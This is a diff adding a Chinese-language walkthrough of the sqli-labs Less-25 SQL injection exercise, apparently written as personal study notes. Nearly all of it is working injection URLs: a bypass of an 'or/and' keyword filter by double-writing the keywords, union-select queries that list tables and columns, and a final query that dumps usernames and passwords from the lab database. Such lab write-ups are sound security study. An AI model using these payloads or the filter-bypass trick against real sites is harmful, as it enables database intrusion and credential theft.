@@ -1,0 +1,39 @@
+http://10.0.2.15/sqli/Less-25/?id=1\
+报错
+
+故推测sql：
+select 字段名 from 表名 where id = '输入的id' limit 0,1;
+
+1.字段数
+http://10.0.2.15/sqli/Less-25/?id=1' order by 3 --+
+根据报错'der by 3 -- ' LIMIT 0,1'，url是order by 3，报错却显示的是der by 3 --+，这说明存在对or的过滤
+绕过过滤or和and的注入一般有四种方法：大小写变形（要求大小写敏感）、双写绕过、在敏感词中添加注释、利用符号替代（如：and用&&替代）
+1）大小写变形
+http://10.0.2.15/sqli/Less-25/?id=1' oRder by 3 --+
+仍旧报错，说明大小写不敏感
+2）双写绕过
+http://10.0.2.15/sqli/Less-25/?id=1' oorrder by 3 --+
+成功绕过
+
+http://10.0.2.15/sqli/Less-25/?id=1' oorrder by 3 --+
+显示正常
+http://10.0.2.15/sqli/Less-25/?id=1' oorrder by 4 --+
+报错。说明字段数为3
+
+2.数据库名
+http://10.0.2.15/sqli/Less-25/?id=0' union select 1, database(),3 --+
+数据库名为security
+
+3.表名
+http://10.0.2.15/sqli/Less-25/?id=0' union select 1,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema = 'security'),3 --+
+注意information中的or也要双写为infoorrmation，否则会被过滤
+表名users,uagents,emails,referers
+
+4.字段名
+http://10.0.2.15/sqli/Less-25/?id=0' union select 1,(select group_concat(column_name) from infoorrmation_schema.columns where table_name = 'users'),3 --+
+字段名：id,username,password,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS
+
+5.字段值
+http://10.0.2.15/sqli/Less-25/?id=0' union select 1,(select group_concat(username,0x3a,passwoorrd) from users),3 --+
+password同理也应该双写为passwoorrd
+字段值：Dumb:1,Angelina:1,Dummy:1,secure:1,stupid:1,superman:1,batman:1,admin:123,admin1:1,admin2:1,admin3:1,dhakkan:1,admin4:1
